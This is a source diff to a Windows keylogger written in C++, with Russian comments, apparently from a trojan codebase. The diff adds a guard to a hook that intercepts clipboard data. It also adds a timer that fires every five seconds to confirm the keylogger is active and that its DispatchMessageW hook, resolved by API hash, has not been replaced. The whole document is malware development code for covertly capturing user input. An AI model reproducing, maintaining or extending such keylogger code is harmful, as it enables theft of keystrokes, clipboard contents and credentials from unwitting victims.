@@ -331,7 +331,7 @@ namespace KeyLoggerHooks
 		{
 			// Проверяем  окно владеющее фокусом
 			PKeyLogger Logger = GetLogger(true);
-			if (Logger == NULL)
+			if (Logger == NULL || KLG.System == NULL)
 				return DataHandle;
 
 			KLGDBG("UnKLG", "Перехватываем данные из буфера обмена. WND = %d ", Logger->ActiveWND);
@@ -1309,10 +1309,34 @@ PCHAR KeyLoggerGetSystemName(PKeyLogger Logger)
 	return Name;
 }
 
+
+
+VOID CALLBACK TestTimerProc(HWND, UINT, UINT_PTR, DWORD)
+{
+	// Выводим сообщение о рабете кейлогера
+	PKeyLogger L = GetLogger(true);
+	if (L)
+		KLGDBG("---- UnKLG", "Кейлогер работает");
+	else
+    	KLGDBG("---- UnKLG", "Кейлогер отключен");
+
+	const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
+
+	LPVOID ProcAddr = GetProcAddressEx(NULL, 3, Hash_DispatchMessageW );
+	if (ProcAddr != &KeyLoggerHooks::Hook_DispatchMessageW)
+		KLGDBG("========== UnKLG", "Хук изменён!!!!!");
+
+}
+
+
 bool KeyLogger::Start()
 {
 	if (GlobalKeyLogger == NULL)
 		return false;
+
+
+
+	pSetTimer(NULL, 15, 5000, TestTimerProc);
 
 	// Запуск кейлогера
 
